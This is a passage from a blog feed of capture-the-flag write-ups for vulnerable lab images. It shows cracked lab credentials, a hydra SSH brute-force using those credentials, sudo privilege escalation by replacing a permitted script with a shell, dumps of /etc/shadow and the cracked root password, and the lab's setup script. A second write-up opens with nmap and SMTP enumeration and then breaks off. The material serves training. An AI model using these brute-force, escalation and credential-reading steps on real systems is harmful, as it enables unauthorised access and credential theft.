</span><span class='line'>football         (mholland)
</span><span class='line'>iloveyou         (rdominguez)
</span><span class='line'>jennifer         (mrodriguez)
</span><span class='line'>master           (strammel)
</span><span class='line'>monkey           (jbresnahan)
</span><span class='line'>pepper           (djohnson)
</span><span class='line'>sunshine         (ccoffee)
</span><span class='line'>whatever         (aheflin)
</span><span class='line'>welcome          (jalcantar)
</span><span class='line'>111111           (jayala)
</span><span class='line'>654321           (bphillips)
</span><span class='line'>666666           (aspears)
</span><span class='line'>killer           (dcooper)
</span><span class='line'>princess         (kclemons)
</span><span class='line'>superman         (aharp)
</span><span class='line'>123123           (tgoodchap)
</span><span class='line'>1234567          (aallen)
</span><span class='line'>cheese           (lmorales)
</span><span class='line'>starwars         (myajima)
</span><span class='line'>Password         (mnader)
</span><span class='line'>nintendo         (dgilfillan)
</span><span class='line'>pokemon          (rjacobson)
</span><span class='line'>passw0rd         (lmartinez)
</span><span class='line'>0                (dtraylor)
</span><span class='line'>consumer         (sjohnson)
</span><span class='line'>gawker           (jduff)
</span><span class='line'>kotaku           (swarren)
</span><span class='line'>babyl0n          (jdavenport)
</span><span class='line'>gizmodo          (qpowers)</span></code></pre></td></tr></table></div></figure></p>

<p>Trying to login through ssh:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.1.120/dump/mysql# john &ndash;format=mysql-sha1 hashes.csv &ndash;show | grep : > ~/user-pass.list
</span><span class='line'>root@kali32:~# hydra -C user-pass.list 192.168.1.120 ssh</span></code></pre></td></tr></table></div></figure></p>

<p>We use one of the accounts to log in and check if there is any user with the higher privileges:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rdominguez@slax:~$ cat /etc/group
</span><span class='line'>root:x:0:root
</span><span class='line'>bin:x:1:root,bin
</span><span class='line'>daemon:x:2:root,bin,daemon
</span><span class='line'>sys:x:3:root,bin,adm
</span><span class='line'>adm:x:4:root,adm,daemon
</span><span class='line'>tty:x:5:
</span><span class='line'>disk:x:6:root,adm
</span><span class='line'>lp:x:7:lp
</span><span class='line'>mem:x:8:
</span><span class='line'>kmem:x:9:
</span><span class='line'>wheel:x:10:root
</span><span class='line'>floppy:x:11:root
</span><span class='line'>mail:x:12:mail
</span><span class='line'>&lt;a href="news:x:13:news">news:x:13:news&lt;/a>
</span><span class='line'>uucp:x:14:uucp
</span><span class='line'>man:x:15:
</span><span class='line'>audio:x:17:root
</span><span class='line'>video:x:18:root
</span><span class='line'>cdrom:x:19:root
</span><span class='line'>games:x:20:
</span><span class='line'>slocate:x:21:
</span><span class='line'>utmp:x:22:
</span><span class='line'>smmsp:x:25:smmsp
</span><span class='line'>tape:x:26:root
</span><span class='line'>mysql:x:27:
</span><span class='line'>rpc:x:32:
</span><span class='line'>sshd:x:33:sshd
</span><span class='line'>gdm:x:42:
</span><span class='line'>shadow:x:43:
</span><span class='line'>&lt;a href="ftp:x:50:">ftp:x:50:&lt;/a>
</span><span class='line'>apache:x:80:
</span><span class='line'>messagebus:x:81:
</span><span class='line'>haldaemon:x:82:
</span><span class='line'>plugdev:x:83:root
</span><span class='line'>power:x:84:
</span><span class='line'>pop:x:90:pop
</span><span class='line'>scanner:x:93:
</span><span class='line'>nobody:x:98:nobody
</span><span class='line'>nogroup:x:99:
</span><span class='line'>users:x:100:ccoffee
</span><span class='line'>console:x:101:
</span><span class='line'>admin:x:102:ccoffee</span></code></pre></td></tr></table></div></figure></p>

<p>Right, ccoffee is in admin group. For other users it is not allowed to use sudo.</p>

<p>We check his competencies:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# ssh 192.168.1.120 -l ccoffee
</span><span class='line'>&lt;a href="&#109;&#97;&#x69;&#108;&#116;&#111;&#x3a;&#99;&#x63;&#x6f;&#x66;&#x66;&#101;&#x65;&#64;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#x2e;&#49;&#46;&#x31;&#x32;&#x30;">&#x63;&#99;&#111;&#x66;&#x66;&#x65;&#x65;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#46;&#49;&#x2e;&#x31;&#x32;&#48;&lt;/a>&rsquo;s password:
</span><span class='line'>Linux 2.6.27.27.
</span><span class='line'>ccoffee@slax:~$ sudo -l
</span><span class='line'>User ccoffee may run the following commands on this host:
</span><span class='line'>    (root) NOPASSWD: /home/ccoffee/scripts/getlogs.sh</span></code></pre></td></tr></table></div></figure></p>

<p>There is a script in his home directory that he can execute, unfortunately we
cannot read the content. Removing the script and creating a new one with the
content &lsquo;sh&rsquo; gives root:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ccoffee@slax:~/scripts$ sudo ./getlogs.sh
</span><span class='line'>sh-3.1#&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>sh-3.1# cat /etc/shadow
</span><span class='line'>root:$1$rxn0aycI$hsQIsFGccfDbCG5/1nfH91:16567:0:::::
</span><span class='line'>bin:&lt;em>:9797:0:::::
</span><span class='line'>daemon:&lt;/em>:9797:0:::::
</span><span class='line'>adm:&lt;em>:9797:0:::::
</span><span class='line'>lp:&lt;/em>:9797:0:::::
</span><span class='line'>sync:&lt;em>:9797:0:::::
</span><span class='line'>shutdown:&lt;/em>:9797:0:::::
</span><span class='line'>halt:&lt;em>:9797:0:::::
</span><span class='line'>mail:&lt;/em>:9797:0:::::
</span><span class='line'>&lt;a href="news:*:9797:0:::::">news:*:9797:0:::::&lt;/a>
</span><span class='line'>uucp:&lt;em>:9797:0:::::
</span><span class='line'>operator:&lt;/em>:9797:0:::::
</span><span class='line'>games:&lt;em>:9797:0:::::
</span><span class='line'>&lt;a href="ftp:*:9797:0:::::">ftp:*:9797:0:::::&lt;/a>
</span><span class='line'>smmsp:&lt;/em>:9797:0:::::
</span><span class='line'>mysql:&lt;em>:9797:0:::::
</span><span class='line'>rpc:&lt;/em>:9797:0:::::
</span><span class='line'>sshd:&lt;em>:9797:0:::::
</span><span class='line'>gdm:&lt;/em>:9797:0:::::
</span><span class='line'>pop:&lt;em>:9797:0:::::
</span><span class='line'>apache:&lt;/em>:9797:0:::::
</span><span class='line'>messagebus:&lt;em>:9797:0:::::
</span><span class='line'>haldaemon:&lt;/em>:9797:0:::::
</span><span class='line'>nobody:*:9797:0:::::
</span><span class='line'>myajima:$1$60c/cucI$5j0aMHbj4jNDRAYhb4m3K0:16567:0:99999:7:::
</span><span class='line'>lmartinez:$1$rMh/hucI$Pr6vOoriwdZPgphX0nSTa1:16567:0:99999:7:::
</span><span class='line'>mbryan:$1$.di/mucI$oOj2Jz4nBoVxTqDo1im.X0:16567:0:99999:7:::
</span><span class='line'>krenfro:$1$Hvj/rucI$Cg2UjwsziydtkBqypwdHp/:16567:0:99999:7:::
</span><span class='line'>dgilfillan:$1$V7l/wucI$cKtiNIUgy2TYFi5pxWCCH.:16567:0:99999:7:::
</span><span class='line'>jduff:$1$uJm//vcI$llf6cmzpyYX84rgky6lfK0:16567:0:99999:7:::
</span><span class='line'>amaynard:$1$QZn/4vcI$8QI5BxGxAMU/aCl7IJ1Nm1:16567:0:99999:7:::
</span><span class='line'>aallen:$1$kso/9vcI$woWfNYjoIWhvV6r5j7Xxa/:16567:0:99999:7:::
</span><span class='line'>aadams:$1$q5q/EvcI$yWIE/.cQu8APDgjY.5ABV/:16567:0:99999:7:::
</span><span class='line'>aard:$1$INr/JvcI$8S6mudd4gUth0CmMxh.Ab0:16567:0:99999:7:::
</span><span class='line'>rpatel:$1$scs/OvcI$8jSf3YcG9TpSU6yuI6q5G0:16567:0:99999:7:::
</span><span class='line'>qpowers:$1$7st/TvcI$7GqfQsXLy2v8CosCkCTNV1:16567:0:99999:7:::
</span><span class='line'>dstevens:$1$d4v/YvcI$dRWsGihSIwWOCOV1uIzzv.:16567:0:99999:7:::
</span><span class='line'>bphillips:$1$2Lw/dvcI$yr0cO6WTpKMPv89xi99Hi/:16567:0:99999:7:::
</span><span class='line'>aheflin:$1$mjx/ivcI$1hvn.7HlbUqLB2Vp.WRpn0:16567:0:99999:7:::
</span><span class='line'>mrodriguez:$1$80z/nvcI$W7S6KtvKXWiJAaDjU6Cbd/:16567:0:99999:7:::
</span><span class='line'>tgoodchap:$1$ER.0svcI$F6ZxBlWOy6pQUlhDC7.VD1:16567:0:99999:7:::
</span><span class='line'>djohnson:$1$Ej/0xvcI$8lRyGhMsdM8OUYA5qbDs1.:16567:0:99999:7:::
</span><span class='line'>mholland:$1$I5100wcI$9tJothOx.INRYNMF7016P/:16567:0:99999:7:::
</span><span class='line'>dtraylor:$1$OT205wcI$vlX3N7czGPvJGOCgOXDzA0:16567:0:99999:7:::
</span><span class='line'>bwatkins:$1$Um30AwcI$Xb333lgx4Mcx7PApUoQnN/:16567:0:99999:7:::
</span><span class='line'>rjacobson:$1$6650FwcI$yHSb8Kr7hUHyny3Y.mDXQ0:16567:0:99999:7:::
</span><span class='line'>jfranklin:$1$Ti60KwcI$nKUPLiDD67sl9lUTf3aJ90:16567:0:99999:7:::
</span><span class='line'>swarren:$1$2y70PwcI$DpY/2bG7k.DUI.E0i19Fh/:16567:0:99999:7:::
</span><span class='line'>mnader:$1$3K90UwcI$3vkAOSnLqK44jBF.kDVWE1:16567:0:99999:7:::
</span><span class='line'>strammel:$1$QmA0ZwcI$mp5SxAjrzs1nqjf6cxztK1:16567:0:99999:7:::
</span><span class='line'>rdominguez:$1$gIC0ewcI$7VCqMoXzYKW1vgzCaglJ6.:16567:0:99999:7:::
</span><span class='line'>jbresnahan:$1$qnD0jwcI$yg30Ub/pK3fcx9U50VP701:16567:0:99999:7:::
</span><span class='line'>cchisholm:$1$K7F0owcI$3WhfwvSnQzEfvVWjZnhm2/:16567:0:99999:7:::
</span><span class='line'>aspears:$1$/ZG0twcI$o1Yw0aAr86poWqk7.PZy3.:16567:0:99999:7:::
</span><span class='line'>dwestling:$1$QxH0ywcI$yXczKrqz56FctGhw3AKV41:16567:0:99999:7:::
</span><span class='line'>sjohnson:$1$1hJ01xcI$hRY/wfBlj3cYqCpPrdO1j.:16567:0:99999:7:::
</span><span class='line'>hlovell:$1$U9L06xcI$kj0vAVGLnx.9TcQr88ZoN0:16567:0:99999:7:::
</span><span class='line'>tdeleon:$1$UaM0BxcI$i9zo//F6m3IGEXWF4E4VU.:16567:0:99999:7:::
</span><span class='line'>ccoffee:$1$FDO0GxcI$1Gl5A67Slt0mhD7iiZaLr/:16567:0:99999:7:::
</span><span class='line'>jalvarez:$1$EbP0LxcI$pMZtEjdYdkrQRCuyw3zQ00:16567:0:99999:7:::
</span><span class='line'>jalcantar:$1$H4R0QxcI$HFlaU41TFGRu0LAC0Fv0g.:16567:0:99999:7:::
</span><span class='line'>sgains:$1$hiS0VxcI$FCEDYdN96OmIfnttnE6f21:16567:0:99999:7:::
</span><span class='line'>bbanter:$1$99U0axcI$TONdzMbnM4yotrbmBCTU7/:16567:0:99999:7:::
</span><span class='line'>lmorales:$1$WZV0fxcI$l5OZvem/JITin7SydRcoS.:16567:0:99999:7:::
</span><span class='line'>jayala:$1$5zW0kxcI$ghdAHJPWYrkNWLatUJwxe1:16567:0:99999:7:::
</span><span class='line'>kclemons:$1$lIY0pxcI$/4/W5o0NzWszs9aKQyZVt/:16567:0:99999:7:::
</span><span class='line'>aharp:$1$qdZ0uxcI$OdHV6pN42eG9DoYc.ToNo0:16567:0:99999:7:::
</span><span class='line'>kwebber:$1$.Eb0zxcI$sdvd7YNQIBUhTFGfBr./W/:16567:0:99999:7:::
</span><span class='line'>dgrant:$1$2cc02ycI$IL9nHFcDzbkDsj97kJk860:16567:0:99999:7:::
</span><span class='line'>jdavenport:$1$uJo0cycI$wH8zAEudh0JToiTfDFYwT/:16567:0:99999:7:::
</span><span class='line'>ktso:$1$/ff0CycI$2mPgNapzGACNxu0MXFs4P1:16567:0:99999:7:::
</span><span class='line'>aweiland:$1$TAh0HycI$pJtJ5xBl2AZc4nbKKBhR6.:16567:0:99999:7:::
</span><span class='line'>dcooper:$1$Egi0MycI$lxdN6qIIFOkCAPTHbk8Tu/:16567:0:99999:7:::</span></code></pre></td></tr></table></div></figure></p>

<p>We realized that the passwords are different when we reboot the server. Digging deeper, we find more clues:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@slax:/mnt/live/memory/changes# cat ./etc/rc.d/rc.local
</span><span class='line'>..
</span><span class='line'>root@slax:/mnt/live# vim /mnt/hdc/slax/rootcopy/opt/lampp/htdocs/setup.sh
</span><span class='line'>..&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;Shuffle the users and passwords, create usernames, and match them up with passwords&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;The <span class="m">50</span> passwords come from top <span class="m">50</span> in Gawker media<span class="p">&amp;</span>rsquo<span class="p">;</span>s password breach&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;shuf -o /opt/lampp/htdocs/pass50.txt /opt/lampp/htdocs/pass50.txt
</span><span class='line'>shuf -o /opt/lampp/htdocs/users.txt /opt/lampp/htdocs/users.txt
</span><span class='line'>awk <span class="p">&amp;</span>lsquo<span class="p">;</span>/./ <span class="o">{</span>print tolower<span class="o">(</span>substr<span class="o">(</span><span class="nv">$1</span>,1,1<span class="o">))</span>tolower<span class="o">(</span><span class="nv">$2</span><span class="o">)}</span><span class="p">&amp;</span>rsquo<span class="p">;</span> /opt/lampp/htdocs/users.txt &gt; /opt/lampp/htdocs/usernames.txt
</span><span class='line'>paste -d<span class="err">&#39;</span> <span class="p">&amp;</span>lsquo<span class="p">;</span> /opt/lampp/htdocs/usernames.txt /opt/lampp/htdocs/pass50.txt /opt/lampp/htdocs/users.txt &gt; /opt/lampp/htdocs/userpass.txt
</span><span class='line'>..&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;Set root OS password&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;echo <span class="p">&amp;</span>ldquo<span class="p">;</span>root:I@47hdlT!@!<span class="p">&amp;</span>rdquo<span class="p">;</span> <span class="p">|</span> chpasswd&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;Root password clue in jdavenport<span class="p">&amp;</span>rsquo<span class="p">;</span>s home dir&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;echo <span class="p">&amp;</span>ldquo<span class="p">;</span>I ate <span class="m">47</span> hot dogs last Tuesday!@!<span class="p">&amp;</span>rdquo<span class="p">;</span> &gt; /home/jdavenport/svrc.txt
</span><span class='line'>..&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;Vulnerable script placed in ccoffee<span class="p">&amp;</span>rsquo<span class="p">;</span>s home dir with a hidden password&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;echo <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="c">#!/bin/bash</span>
</span><span class='line'><span class="k">if</span> <span class="o">[</span> <span class="se">\&amp;</span>rdquo<span class="p">;</span><span class="se">\$</span>2<span class="se">\&amp;</span>ldquo<span class="p">;</span> <span class="o">==</span> <span class="se">\&quot;</span>emerald<span class="se">\&amp;</span>rdquo<span class="p">;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
</span><span class='line'>        <span class="k">while</span> <span class="nb">read </span>line
</span><span class='line'>        <span class="k">do</span>
</span><span class='line'>                <span class="nb">echo</span> <span class="se">\$</span>line
</span><span class='line'>        <span class="k">done</span> <span class="p">&amp;</span>lt<span class="p">;</span> <span class="se">\$</span>1
</span><span class='line'><span class="k">else</span>
</span><span class='line'>        <span class="nb">echo</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>wrong!<span class="p">&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'><span class="k">fi</span>
</span><span class='line'><span class="p">&amp;</span>ldquo<span class="p">;</span> &gt; /home/ccoffee/scripts/getlogs.sh
</span></code></pre></td></tr></table></div></figure></p>

<p>Finally with this information, we was able to successfully crack the whole /etc/shadow:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# john hashes.john &ndash;show
</span><span class='line'>root:I@47hdlT!@!:16567:0:::::
</span><span class='line'>myajima:12345678:16567:0:99999:7:::
</span><span class='line'>lmartinez:computer:16567:0:99999:7:::
</span><span class='line'>mbryan:sunshine:16567:0:99999:7:::
</span><span class='line'>krenfro:master:16567:0:99999:7:::
</span><span class='line'>dgilfillan:1234:16567:0:99999:7:::
</span><span class='line'>jduff:welcome:16567:0:99999:7:::
</span><span class='line'>amaynard:iloveyou:16567:0:99999:7:::
</span><span class='line'>aallen:pepper:16567:0:99999:7:::
</span><span class='line'>aadams:trustno1:16567:0:99999:7:::
</span><span class='line'>aard:123123:16567:0:99999:7:::
</span><span class='line'>rpatel:password:16567:0:99999:7:::
</span><span class='line'>qpowers:lifehack:16567:0:99999:7:::
</span><span class='line'>dstevens:cheese:16567:0:99999:7:::
</span><span class='line'>bphillips:baseball:16567:0:99999:7:::
</span><span class='line'>aheflin:football:16567:0:99999:7:::
</span><span class='line'>mrodriguez:kotaku:16567:0:99999:7:::
</span><span class='line'>tgoodchap:killer:16567:0:99999:7:::
</span><span class='line'>djohnson:consumer:16567:0:99999:7:::
</span><span class='line'>mholland:0:16567:0:99999:7:::
</span><span class='line'>dtraylor:princess:16567:0:99999:7:::
</span><span class='line'>bwatkins:jordan:16567:0:99999:7:::
</span><span class='line'>rjacobson:654321:16567:0:99999:7:::
</span><span class='line'>jfranklin:qwerty:16567:0:99999:7:::
</span><span class='line'>swarren:Password:16567:0:99999:7:::
</span><span class='line'>mnader:michelle:16567:0:99999:7:::
</span><span class='line'>strammel:letmein:16567:0:99999:7:::
</span><span class='line'>rdominguez:shadow:16567:0:99999:7:::
</span><span class='line'>jbresnahan:soccer:16567:0:99999:7:::
</span><span class='line'>cchisholm:whatever:16567:0:99999:7:::
</span><span class='line'>aspears:111111:16567:0:99999:7:::
</span><span class='line'>dwestling:123456:16567:0:99999:7:::
</span><span class='line'>sjohnson:batman:16567:0:99999:7:::
</span><span class='line'>hlovell:michael:16567:0:99999:7:::
</span><span class='line'>tdeleon:gawker:16567:0:99999:7:::
</span><span class='line'>ccoffee:gizmodo:16567:0:99999:7:::
</span><span class='line'>jalvarez:blahblah:16567:0:99999:7:::
</span><span class='line'>jalcantar:nintendo:16567:0:99999:7:::
</span><span class='line'>sgains:dragon:16567:0:99999:7:::
</span><span class='line'>bbanter:12345:16567:0:99999:7:::
</span><span class='line'>lmorales:jennifer:16567:0:99999:7:::
</span><span class='line'>jayala:666666:16567:0:99999:7:::
</span><span class='line'>kclemons:monkey:16567:0:99999:7:::
</span><span class='line'>aharp:passw0rd:16567:0:99999:7:::
</span><span class='line'>kwebber:superman:16567:0:99999:7:::
</span><span class='line'>dgrant:internet:16567:0:99999:7:::
</span><span class='line'>jdavenport:babyl0n:16567:0:99999:7:::
</span><span class='line'>ktso:starwars:16567:0:99999:7:::
</span><span class='line'>aweiland:abc123:16567:0:99999:7:::
</span><span class='line'>dcooper:pokemon:16567:0:99999:7:::&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>50 password hashes cracked, 0 left</span></code></pre></td></tr></table></div></figure></p>

<p>There is also a trace that the root user connected via ssh to another server with IP address 192.168.1.20:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@slax:~# cat .ssh/known_hosts
</span><span class='line'>192.168.1.20 ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA3ViCbImH/GTN+b1DigEYLnrUSHk8J7ZEt6+IX1etXQx89VQXhKAh098dpoUIAlnYIIsCcvmqHSwbCY0JxwwoV7bHqfQB/y05hWv//hQ6hhOIJBJfTOuezAgMxEbZbfaEJf5U3ROhGd4TbdIrsaoPruQ9asG/ok6yrWfKBK6pcizIxL/Q+uvRlcC8X=</span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DE-ICE-S2.100]]></title>
    <link href="http://73696e65.github.io/blog/2015/05/10/de-ice-s2-dot-100/"/>
    <updated>2015-05-10T11:40:38+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/05/10/de-ice-s2-dot-100</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/de-ice-s2100,13/">De-ICE: S2.100</a></p>

<p>Nmap output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT    STATE  SERVICE  VERSION
</span><span class='line'>21/tcp  open   ftp      vsftpd 2.0.4
</span><span class='line'>22/tcp  open   ssh      OpenSSH 4.3 (protocol 1.99)
</span><span class='line'>25/tcp  open   smtp     Sendmail 8.13.7/8.13.7
</span><span class='line'>80/tcp  open   http     Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
</span><span class='line'>110/tcp open   pop3     Openwall popa3d
</span><span class='line'>143/tcp open   imap     UW imapd 2004.357</span></code></pre></td></tr></table></div></figure></p>

<p>We found out that there is another IP address on the same network:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Nmap scan report for 192.168.2.101
</span><span class='line'>Host is up (0.00038s latency).
</span><span class='line'>Not shown: 999 filtered ports
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>80/tcp open  http
</span><span class='line'>MAC Address: 00:0C:29:53:2F:A3 (VMware)</span></code></pre></td></tr></table></div></figure></p>

<p>Enumerating SMTP users, we get:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
